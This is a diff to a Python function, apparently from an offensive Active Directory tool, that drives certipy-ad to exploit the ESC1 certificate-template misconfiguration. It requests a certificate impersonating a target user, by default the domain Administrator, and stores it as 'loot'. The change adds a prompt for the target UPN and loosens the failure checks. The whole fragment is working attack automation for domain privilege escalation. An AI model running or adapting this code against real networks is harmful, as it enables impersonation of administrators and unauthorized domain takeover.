@@ -16,9 +16,11 @@ def abuse_esc1(session, template_name):
     if not ca_name or ca_name.lower() == "n/a":
         print(red("[-] CA name is missing or invalid."))
         return
+    
+    default_upn = f"Administrator@{session.domain}"
+    upn = input(f"[?] Enter target UPN [default: {default_upn}]: ").strip() or default_upn
 
     output_file = f"esc1_{template_name}.pfx"
-    upn = f"Administrator@{session.domain}"
 
     cmd = [
         "certipy-ad", "req",
@@ -35,14 +37,15 @@ def abuse_esc1(session, template_name):
     output, err = run_command(" ".join(cmd))
 
     if err:
-        print(red(f"[!] Certipy returned error:\n{err.strip()}"))
+        print(yellow(f"[!] Certipy returned error:\n{err.strip()}"))
 
-    if not os.path.exists(output_file) or os.path.getsize(output_file) < 100:
-        print(red("[-] Certificate request failed or file not created."))
-        return
-
-    with open(output_file, "rb") as f:
-        save_loot(output_file, f.read(), binary=True)
+    if os.path.exists(output_file):
+        with open(output_file, "rb") as f:
+            data = f.read()
+        save_loot(output_file, data, binary=True)
+        print(green(f"[+] Certificate saved to loot/{output_file}"), flush=True)
+    else:
+        print(red("[-] Certificate file not found after request."), flush=True)
 
     print(green(f"[+] Certificate request successful!"))
     print(green(f"[+] Certificate saved to: loot/{output_file}"))
